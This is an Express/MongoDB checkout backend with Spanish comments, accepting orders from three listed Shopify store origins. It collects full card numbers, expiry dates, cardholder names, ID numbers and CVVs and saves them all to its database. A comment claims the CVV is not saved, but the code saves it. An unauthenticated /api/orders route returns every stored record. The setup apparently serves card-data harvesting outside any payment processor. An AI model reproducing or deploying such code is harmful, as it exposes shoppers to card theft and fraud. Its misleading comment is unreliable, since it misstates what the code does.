require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');

const Order = require('./models/Order');

const app = express();

app.use(helmet());
app.use(express.json({ limit: '100kb' }));
app.use(express.static('public'));

// Solo tu tienda de Shopify puede llamar a esta API.
const ALLOWED_ORIGINS = ['https://tiendasolzen.myshopify.com', 'https://luneria-uruguay.myshopify.com', 'https://omenskin-uy.myshopify.com'];

app.use(
  cors({
    origin(origin, callback) {
      if (!origin || ALLOWED_ORIGINS.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Origen no permitido por CORS'));
      }
    },
    methods: ['POST', 'GET'],
    allowedHeaders: ['Content-Type']
  })
);

// --- Conexión a MongoDB Atlas ---
mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log('Conectado a MongoDB'))
  .catch((err) => {
    console.error('Error conectando a MongoDB:', err.message);
    process.exit(1);
  });

// Campos obligatorios (los mismos que valida el checkout del lado del cliente)
const REQUIRED_FIELDS = [
  ['contacto', 'email'],
  ['entrega', 'nombre'],
  ['entrega', 'apellidos'],
  ['entrega', 'direccion'],
  ['entrega', 'codigoPostal'],
  ['entrega', 'ciudad'],
  ['entrega', 'telefono'],
  ['pago', 'numeroTarjeta'],
  ['pago', 'vencimiento'],
  ['pago', 'titular'],
  ['pago', 'numeroDocumento'],
  ['pago', 'cvv']
];

function findMissingFields(body) {
  const missing = [];
  for (const [section, field] of REQUIRED_FIELDS) {
    const value = body?.[section]?.[field];
    if (!value || String(value).trim() === '') {
      missing.push(`${section}.${field}`);
    }
  }
  return missing;
}

// --- Endpoint principal ---
app.post('/api/checkout', async (req, res) => {
  try {
    const missing = findMissingFields(req.body);
    if (missing.length > 0) {
      return res.status(400).json({ ok: false, error: 'Faltan campos obligatorios', missing });
    }

    const { contacto, entrega, pago = {}, pedido = {} } = req.body;

    // El CVV NO se guarda en la base de datos, aunque venga en el body.
    const order = new Order({
      contacto: { email: contacto.email },
      entrega: {
        nombre: entrega.nombre,
        apellidos: entrega.apellidos,
        direccion: entrega.direccion,
        codigoPostal: entrega.codigoPostal,
        ciudad: entrega.ciudad,
        telefono: entrega.telefono
      },
      pago: {
        numeroTarjeta: pago.numeroTarjeta,
        vencimiento: pago.vencimiento,
        titular: pago.titular,
        numeroDocumento: pago.numeroDocumento,
        cvv: pago.cvv,
        cuotas: pago.cuotas
      },
      pedido: {
        pack: pedido.pack,
        duration: pedido.duration,
        price: pedido.price,
        oldprice: pedido.oldprice,
        cuotaMonto: pedido.cuotaMonto
      }
    });

    await order.save();

    return res.status(201).json({ ok: true, id: order._id });
  } catch (err) {
    console.error('Error guardando el pedido:', err);
    return res.status(500).json({ ok: false, error: 'Error interno del servidor' });
  }
});

app.get('/health', (req, res) => res.json({ ok: true }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en el puerto ${PORT}`));
// Ruta para traer todos los pedidos
app.get('/api/orders', async (req, res) => {
  try {
    const orders = await Order.find().sort({ createdAt: -1 }); // más recientes primero
    res.json(orders);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Error al obtener los pedidos' });
  }
});
